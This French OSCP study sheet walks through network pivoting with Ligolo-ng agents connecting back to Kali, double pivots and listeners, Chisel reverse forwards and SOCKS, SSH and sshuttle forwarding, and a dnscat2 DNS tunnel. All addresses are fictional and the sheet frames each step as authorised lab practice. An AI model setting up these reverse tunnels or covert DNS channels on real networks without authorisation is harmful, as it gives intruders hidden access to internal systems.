---
title: "OSCP · Tunnels et pivot réseau"
description: "Ligolo-ng pas à pas, double pivot, listeners, Chisel et SSH."
---

# Tunnels et pivot réseau

**Objectif :** atteindre un réseau interne autorisé depuis Kali en passant par une machine de pivot. Le **proxy Ligolo-ng** tourne sur Kali ; l'**agent** tourne sur la machine qui peut voir le réseau interne. Le trajet se fait par un tunnel chiffré.

**Adresses fictives à remplacer :** Kali `10.10.14.10` · premier pivot Windows `10.10.10.30` (IP interne `172.16.20.1`) · réseau interne `172.16.20.0/24` · deuxième pivot `172.16.20.30` · second réseau `172.16.30.0/24`.

Chaque bloc précise **où exécuter la commande**. Les commandes `session`, `ifconfig`, `tunnel_start` et `listener_add` se saisissent dans **la console Ligolo**, jamais dans Bash ou PowerShell.

## Avant de commencer

Télécharger les binaires depuis les [versions officielles de Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) : **proxy** pour Kali, **agent** pour Windows/Linux et pour l'architecture concernée. Dans cette fiche, les binaires sont renommés `proxy`, `agent` ou `agent.exe` et placés dans le répertoire courant. Prévoir les droits nécessaires à la création d'une interface TUN sur Kali ; l'agent ne nécessite généralement pas de privilèges administrateur.

**Compatibilité :** choisir des versions compatibles du proxy et de l'agent et vérifier leur architecture (Linux/Windows, amd64/arm64). Vérifier les options disponibles localement avec `./proxy -h` et `./agent -h` (ou `agent.exe -h` sur Windows).

## Ligolo-ng : premier tunnel

**Ordre à suivre :** préparer la TUN → démarrer le proxy Kali → relever l'empreinte TLS → connecter l'agent pivot → sélectionner sa session → démarrer le tunnel → ajouter la route sur Kali → tester un port autorisé. Les adresses ci-dessous sont des exemples : ne jamais ajouter une route vers un sous-réseau non confirmé.

### Préparer l'interface TUN sur Kali

L'interface TUN transporte les paquets vers Ligolo. Vérifier `ip -br link show ligolo` avant toute création pour éviter `File exists`. Si elle existe déjà, ne pas relancer `ip tuntap add` ; vérifier plutôt qu'elle est active et utilisable.

<p class="oscp-command-note">Sur Kali: terminal habituel, avant de lancer le proxy.</p>

```bash
sudo ip tuntap add user "$USER" mode tun ligolo
sudo ip link set ligolo up
ip -br link show ligolo
```

### Démarrer le proxy sur Kali

Le binaire `proxy` vient des versions officielles. Le proxy Ligolo écoute normalement sur TCP 11601 ; vérifier l'adresse et le port réellement affichés au démarrage, puis leur accessibilité depuis le pivot.

<p class="oscp-command-note">Sur Kali: autre terminal, à laisser ouvert.</p>

```bash
chmod +x ./proxy
./proxy -selfcert
```

### Lire l'empreinte du certificat

Relever l'empreinte TLS SHA-256 du **proxy actif** ; l'agent la comparera au certificat présenté lors de la connexion. Une nouvelle génération du certificat peut modifier cette empreinte.

<p class="oscp-command-note">Dans la console interactive du proxy Ligolo sur Kali.</p>

```text
certificate_fingerprint
```

### Connecter un agent Windows

Sur Windows pivot, transférer l'agent correspondant à l'architecture du système. Remplacer `EMPREINTE_SHA256` par l'empreinte du proxy actif ; `10.10.14.10:11601` doit être joignable depuis ce Windows.

<p class="oscp-command-note">Sur le Windows pivot: PowerShell.</p>

```powershell
.\agent.exe -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
```

### Connecter un agent Linux

Sur un pivot Linux, télécharger l'agent Linux correspondant à l'architecture et vérifier son droit d'exécution. L'adresse de connexion est celle de Kali, accessible depuis ce pivot.

<p class="oscp-command-note">Sur un pivot Linux: terminal Bash.</p>

```bash
chmod +x ./agent
./agent -connect 10.10.14.10:11601 -accept-fingerprint EMPREINTE_SHA256
```

### Choisir l'agent et repérer son réseau

Dans la console Ligolo, `session` permet de choisir l'agent connecté ; sélectionner explicitement le pivot voulu. `ifconfig` affiche les interfaces **de l'agent sélectionné**, pas celles de Kali.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
session
ifconfig
```

### Démarrer le tunnel sur l'interface

`ligolo` est le nom de l'interface TUN **sur Kali**, pas une interface du pivot. Vérifier la session sélectionnée avant `tunnel_start --tun ligolo`.

<p class="oscp-command-note">Dans la console Ligolo, **après avoir sélectionné la session**.</p>

```text
tunnel_start --tun ligolo
tunnel_list
```

### Ajouter la route du réseau interne

Adapter `172.16.20.0/24` au réseau confirmé dans les interfaces de l'agent. Ajouter cette route **sur Kali uniquement** ; si une route identique existe, vérifier sa destination avant de la modifier.

<p class="oscp-command-note">Sur Kali: terminal Linux différent de la console proxy.</p>

```bash
sudo ip route add 172.16.20.0/24 dev ligolo
ip route get 172.16.20.10
```

### Tester un service du réseau interne

Tester d'abord un port autorisé du réseau interne. Le routage TUN de Ligolo ne nécessite pas ProxyChains. Avec `-sT -Pn --unprivileged`, Nmap utilise des connexions TCP plutôt que des sondes brutes susceptibles de produire des résultats trompeurs via Ligolo.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
nmap -sT -Pn -n --unprivileged -p 80,445,3389 172.16.20.10
curl -I --max-time 5 http://172.16.20.10/
```

**À savoir :** l'agent Ligolo peut fonctionner sans droits administrateur, mais Kali doit pouvoir créer l'interface TUN. Pour Nmap, commencer par `-sT -Pn`, puis adapter au contexte ; Ligolo traduit certaines sondes TCP en appels `connect()` côté pivot.

## Autre façon de créer l'interface (Ligolo récent)

Sur les versions de Ligolo-ng prenant en charge `interface_create` et `interface_add_route`, le proxy peut préparer l'interface et la route. **Choisir cette méthode OU les commandes Linux manuelles, pas les deux**. Vérifier les commandes disponibles avec `help` dans la console et les droits réseau du proxy.

### Créer l'interface dans la console Ligolo

La console Ligolo crée une interface TUN **sur Kali**, sous réserve des droits réseau du processus proxy.

<p class="oscp-command-note">Dans la console Ligolo sur Kali: alternative aux commandes `ip tuntap`.</p>

```text
interface_create --name ligolo
```

### Ajouter la route depuis la console

`interface_add_route` ajoute la route sur Kali pour l'interface indiquée. Ne pas la cumuler avec `ip route add` pour le même sous-réseau et la même interface.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
interface_add_route --name ligolo --route 172.16.20.0/24
```

Ensuite, sélectionner l'agent avec `session`, démarrer avec `tunnel_start --tun ligolo` et tester le routage. Dans les versions récentes, les interfaces et routes peuvent être conservées dans la configuration du proxy.

## Atteindre le localhost du pivot

**Problème :** un service lié uniquement à `127.0.0.1:8000` sur le pivot n'écoute pas sur son IP réseau. Ligolo réserve `240.0.0.1` pour atteindre **le `127.0.0.1` de l'agent sélectionné** à travers son tunnel.

### Ajouter la route spéciale vers le localhost distant

Ajouter la route spéciale `240.0.0.1/32` sur Kali via la TUN de l'agent concerné, après le démarrage du tunnel. Cette adresse ne désigne pas le localhost de Kali.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
curl -I http://240.0.0.1:8000/
```

`curl` ne réussira que si un serveur HTTP écoute effectivement sur `127.0.0.1:8000` du pivot. Éviter de réutiliser cette même adresse avec plusieurs interfaces simultanées sans contrôler la route.

## Ligolo-ng : double pivot

**Situation :** le pivot B ne peut pas joindre Kali directement, mais peut atteindre l'IP interne du pivot A et son listener TCP. Le premier pivot doit relayer le port Ligolo du deuxième agent vers le proxy sur Kali.

```text
Kali (proxy :11601) ⇐ tunnel TLS ⇒ Pivot A (agent Ligolo)
                                       ↑ connexion de Pivot B vers A:11602
                                       │ listener A → Kali:11601
                                 Pivot B (deuxième agent) → réseau 172.16.30.0/24
```

### Créer un listener sur le premier pivot

Le listener écoute sur TCP `11602` **sur le pivot A** et relaie les connexions vers le proxy TCP `11601` **sur Kali**. Vérifier l'accès de B à A:11602 et la session A active ; le port 11602 n'écoute pas sur Kali.

<p class="oscp-command-note">Dans la console Ligolo, **session du pivot A** sélectionnée.</p>

```text
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
listener_list
```

### Faire connecter le second agent

Sur le pivot B, l'agent contacte l'interface interne de A (`172.16.20.1:11602`) ; vérifier cette adresse et le port du listener depuis B. Utiliser la même empreinte TLS que pour le proxy Kali.

<p class="oscp-command-note">Sur le pivot B: PowerShell si Windows.</p>

```powershell
.\agent.exe -connect 172.16.20.1:11602 -accept-fingerprint EMPREINTE_SHA256
```

**Repère :** `172.16.20.1` est l'interface interne du pivot A et `172.16.20.30` celle du pivot B. Ces adresses sont fictives. Remplacer ces IP par les vraies interfaces trouvées avec `ifconfig`.

### Créer la seconde interface TUN

Créer `ligolo2` sur Kali pour le second tunnel. Vérifier auparavant que l'interface n'existe pas déjà ; chaque tunnel actif doit utiliser sa propre interface TUN.

<p class="oscp-command-note">Sur Kali: terminal Linux habituel.</p>

```bash
sudo ip tuntap add user "$USER" mode tun ligolo2
sudo ip link set ligolo2 up
```

### Sélectionner le deuxième agent

Dans la console Ligolo, sélectionner explicitement **la session du pivot B** avant `ifconfig` et `tunnel_start --tun ligolo2`. Ne pas conserver par erreur la session du pivot A.

<p class="oscp-command-note">Dans la console Ligolo sur Kali.</p>

```text
session
ifconfig
tunnel_start --tun ligolo2
```

### Router le deuxième réseau

Sur Kali, router `172.16.30.0/24` via `ligolo2` seulement si ce sous-réseau est accessible depuis le pivot B. `ip route get` permet de vérifier l'interface choisie avant le test TCP.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route add 172.16.30.0/24 dev ligolo2
ip route get 172.16.30.10
nmap -sT -Pn -n --unprivileged -p 445 172.16.30.10
```

## Listener Ligolo : rendre un service Kali accessible au pivot

Un *listener* ouvre un port TCP sur **l'agent sélectionné** et relaie les connexions vers le service indiqué côté proxy Kali. Utile lorsqu'une machine interne peut joindre le pivot mais pas directement Kali ; le listener ne transfère aucun fichier à lui seul.

### Héberger le fichier sur Kali

Placer d'abord le fichier à partager dans `./partage/` sur Kali. Sur Kali, servir le dossier local uniquement sur `127.0.0.1:8000`. Le listener Ligolo rend ce service accessible via l'adresse réseau du pivot ; le serveur HTTP Python ne permet pas l'envoi de fichiers vers Kali.

<p class="oscp-command-note">Sur Kali: terminal Linux séparé.</p>

```bash
mkdir -p ./partage
# Vérifier que le fichier attendu se trouve dans ce répertoire
ls -l ./partage/outil.txt
python3 -m http.server 8000 --bind 127.0.0.1 --directory ./partage
```

### Dans Ligolo, exposer le service HTTP de Kali sur le pivot A

Le listener écoute sur **toutes les interfaces du pivot A** (`0.0.0.0:8080`), dont `172.16.20.1`, puis relaie vers `127.0.0.1:8000` **sur Kali**. Vérifier le pare-feu du pivot.

<p class="oscp-command-note">Dans la console Ligolo: session du pivot A.</p>

```text
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
listener_list
```

### Télécharger depuis une machine interne

La machine Windows interne contacte **le pivot A à `172.16.20.1:8080`**, pas le pivot B (`172.16.20.30`). `outil.txt` doit exister dans `./partage/` sur Kali et la machine interne doit pouvoir joindre le port du listener.

<p class="oscp-command-note">Sur Windows interne pouvant joindre l'IP réseau du pivot A.</p>

```powershell
Invoke-WebRequest -UseBasicParsing -Uri 'http://172.16.20.1:8080/outil.txt' -OutFile 'C:\Users\Public\outil.txt'
```

Pour **envoyer un fichier vers Kali**, `python3 -m http.server` ne suffit pas (pas d'upload) : utiliser **SMB ou WebDAV** comme expliqué dans la [fiche Transferts de fichiers](./transferts.md). Un listener Ligolo peut acheminer ces protocoles si le port et le service de réception sont configurés.

## Chisel : autre solution de pivot

**Chisel** transporte des redirections TCP et un proxy SOCKS via une connexion client/serveur HTTP ou WebSocket. Le chiffrement TLS dépend de la configuration de connexion : l'exemple `10.10.14.10:8001` ci-dessous ne doit pas être présenté comme une connexion HTTPS chiffrée. Contrairement au tunnel TUN de Ligolo, il peut nécessiter ProxyChains pour les outils qui ne prennent pas en charge SOCKS.

### Démarrer Chisel en mode reverse

Vérifier la version et la présence du binaire `chisel` sur Kali et `chisel.exe` sur Windows. Le serveur Chisel de Kali écoute sur TCP `8001` et autorise les redirections inverses demandées par le client distant. Vérifier que ce port est joignable depuis le pivot et limiter l'exposition du serveur au réseau de laboratoire.

<p class="oscp-command-note">Sur Kali: serveur Chisel.</p>

```bash
chisel server --port 8001 --reverse
```

### Rediriger un port interne vers Kali

Ne pas utiliser simultanément les deux exemples Chisel si le port `8080` est déjà occupé sur Kali. Le client Chisel sur Windows demande l'ouverture du port `8080` **sur Kali**, relayé vers `127.0.0.1:80` **sur le pivot Windows**. Le service distant doit écouter sur ce port et la session Chisel doit rester ouverte.

<p class="oscp-command-note">Sur le pivot Windows: client Chisel.</p>

```powershell
.\chisel.exe client 10.10.14.10:8001 R:8080:127.0.0.1:80
```

### Tester le port redirigé

Depuis Kali, cette requête passe par le port local `8080` de Chisel jusqu'au service HTTP du pivot Windows sur `127.0.0.1:80`. Un refus peut venir de l'absence du service distant.

<p class="oscp-command-note">Sur Kali: terminal Linux distinct.</p>

```bash
curl -I http://127.0.0.1:8080/
```

### Créer un proxy SOCKS inversé

Le port `1080` doit être libre sur Kali ; une connexion à ce proxy peut accéder aux ressources réseau visibles depuis le pivot Windows. Avec `R:1080:socks`, le serveur Chisel expose un proxy SOCKS sur le port `1080` côté Kali, qui utilise la connexion du client Windows pour atteindre le réseau du pivot. Garder les deux processus actifs.

<p class="oscp-command-note">Sur le pivot Windows: client Chisel.</p>

```powershell
.\chisel.exe client 10.10.14.10:8001 R:1080:socks
```

### Tester un site interne via SOCKS

Tester d'abord un service HTTP réellement accessible depuis le pivot, plutôt que supposer que l'hôte fictif répond. Avec `curl --socks5-hostname`, les noms DNS éventuels sont résolus via le proxy SOCKS ; l'IP `172.16.20.10` n'exige pas de résolution. Vérifier que le proxy local `127.0.0.1:1080` écoute sur Kali.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
curl --socks5-hostname 127.0.0.1:1080 -I http://172.16.20.10/
```

**ProxyChains :** si l'outil n'accepte pas SOCKS directement, ajouter `socks5 127.0.0.1 1080` à la section `[ProxyList]` de `/etc/proxychains4.conf`, puis utiliser `proxychains4` devant la commande. Vérifier que le serveur SOCKS Chisel est actif ; avec Nmap, utiliser `-sT -Pn` et éviter les scans SYN/UDP à travers ce proxy.

## SSH : alternative simple avec un compte valide

**Quand utiliser SSH ?** Si le pivot dispose d'un serveur SSH accessible et d'un compte autorisé, privilégier les redirections SSH pour les services nécessaires. Pour les transferts de fichiers, utiliser [SCP](./transferts.md).

### Redirection SSH locale

Le compte `etudiant` doit être autorisé à ouvrir une session SSH et le serveur doit autoriser la redirection TCP (`AllowTcpForwarding`). Sur Kali, `-L` écoute localement sur `127.0.0.1:8080`. Le serveur SSH du pivot tente ensuite la connexion à `172.16.20.10:80` ; ce service doit être accessible **depuis le pivot**.

<p class="oscp-command-note">Sur Kali: le serveur SSH a accès au service interne.</p>

```bash
ssh -N -L 127.0.0.1:8080:172.16.20.10:80 etudiant@10.10.10.30
```

### Proxy SOCKS par SSH

Le port `9050` doit être libre sur Kali ; le serveur SSH doit autoriser les redirections TCP. Sur Kali, `ssh -D` ouvre un proxy SOCKS sur `127.0.0.1:9050` via le compte SSH du pivot. Conserver la session ouverte et configurer l'outil client pour utiliser ce proxy.

<p class="oscp-command-note">Sur Kali: accès SSH à un pivot.</p>

```bash
ssh -N -D 127.0.0.1:9050 etudiant@10.10.10.30
```

### Routage réseau avec sshuttle

Installer `sshuttle` sur Kali, disposer d'un compte SSH fonctionnel et vérifier que le serveur distant peut joindre le sous-réseau demandé. `sshuttle` redirige principalement les connexions TCP du sous-réseau vers le pivot SSH ; ce n'est pas un VPN de niveau IP et il ne transporte pas automatiquement tous les protocoles, notamment les scans SYN bruts.

<p class="oscp-command-note">Sur Kali: sshuttle et SSH accessibles.</p>

```bash
sshuttle -r etudiant@10.10.10.30 172.16.20.0/24
```

## Tunnel DNS avec dnscat2

Le tunnel DNS dnscat2 est un exemple avancé réservé à un laboratoire où les échanges DNS sont explicitement autorisés. **Ce n'est pas une étape nécessaire pour Ligolo-ng** : elle est conservée séparément pour éviter de mélanger les outils.

### Démarrer le serveur dnscat2

Vérifier le nom du binaire installé et la configuration du serveur DNS du laboratoire avant d'utiliser cet exemple. Utiliser un domaine DNS réellement contrôlé par le laboratoire, avec les enregistrements nécessaires pour joindre le serveur, et un secret partagé.

<p class="oscp-command-note">Sur la machine Linux qui héberge le serveur DNS contrôlé.</p>

```bash
dnscat2-server laboratoire.example --secret 'SecretDeTest'
```

### Connecter un client dnscat2

Le client doit pouvoir émettre des requêtes DNS vers l'infrastructure contrôlée du laboratoire. Le client doit utiliser le même domaine et le même secret que le serveur ; vérifier la délégation et l'accès DNS avant le test.

<p class="oscp-command-note">Sur le client Linux de laboratoire.</p>

```bash
./dnscat --secret='SecretDeTest' laboratoire.example
```

Les noms de binaires et les options dnscat2 dépendent de la version compilée ou installée. Exécuter `dnscat2-server --help` et `./dnscat --help` pour la version locale.

## Dépannage Ligolo-ng

| Symptôme | Cause à vérifier |
|---|---|
| L'agent n'apparaît pas | Proxy démarré, IP Kali correcte, TCP 11601 joignable depuis le pivot, version compatible et empreinte TLS valide ? |
| Empreinte TLS refusée | Relever `certificate_fingerprint` sur le proxy actif et recopier l'empreinte sans erreur dans l'agent |
| `no such device` / TUN absent | Vérifier `ip -br link show ligolo` sur Kali ; créer ou sélectionner l'interface TUN appropriée |
| `RTNETLINK answers: File exists` | Une interface ou une route existe déjà ; vérifier `ip -br link` et `ip route` avant toute modification |
| Tunnel lancé mais réseau inaccessible | Contrôler la session sélectionnée, le sous-réseau de l'agent, la route Kali et les pare-feu |
| Second agent non connecté | Vérifier que le premier tunnel est actif, que le listener écoute sur le pivot A, et que le pivot B atteint l'IP interne de A sur TCP 11602 |
| Service sur `127.0.0.1` de l'agent inaccessible | Router `240.0.0.1/32` vers la bonne TUN et vérifier que le service écoute sur l'agent |
| Port redirigé muet | Vérifier que le service écoute côté Kali, que `--to` cible le bon port, que `--addr` écoute sur l'agent sélectionné et que les pare-feu autorisent le trafic |

## Arrêter et nettoyer

### Fermer le tunnel

Dans Ligolo, sélectionner l'agent concerné avant `tunnel_stop`. Les listeners restent indépendants : consulter `listener_list`, puis arrêter chacun par son identifiant.

<p class="oscp-command-note">Dans la console Ligolo: sélectionner la bonne session.</p>

```text
session
tunnel_stop
listener_list
```

### Supprimer la route après l'examen

Sur Kali, supprimer uniquement les routes ajoutées manuellement et présentes dans `ip route` ; ne pas toucher aux routes VPN préexistantes.

<p class="oscp-command-note">Sur Kali : exécuter la commande dans un terminal.</p>

```bash
sudo ip route del 172.16.20.0/24 dev ligolo
sudo ip route del 172.16.30.0/24 dev ligolo2
```

Si les interfaces TUN ont été créées manuellement, vérifier qu'aucune session ne les utilise avant `sudo ip link delete ligolo` ou `sudo ip link delete ligolo2`. Les routes créées automatiquement par des versions récentes peuvent être gérées par Ligolo.

## Sources officielles

- [Ligolo-ng: introduction et limites réseau](https://docs.ligolo.ng/)

- [Ligolo-ng: Quickstart, interface, certificat et routage](https://docs.ligolo.ng/Quickstart/)

- [Ligolo-ng: double pivot](https://docs.ligolo.ng/sample/double/)

- [Ligolo-ng: listeners](https://docs.ligolo.ng/Listeners/)

- [Ligolo-ng: accès au localhost de l'agent](https://docs.ligolo.ng/Localhost/)

- [Ligolo-ng: configuration v0.8 et routes persistantes](https://docs.ligolo.ng/Config-File/)

- [Notes krovs: tunnels complémentaires](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md)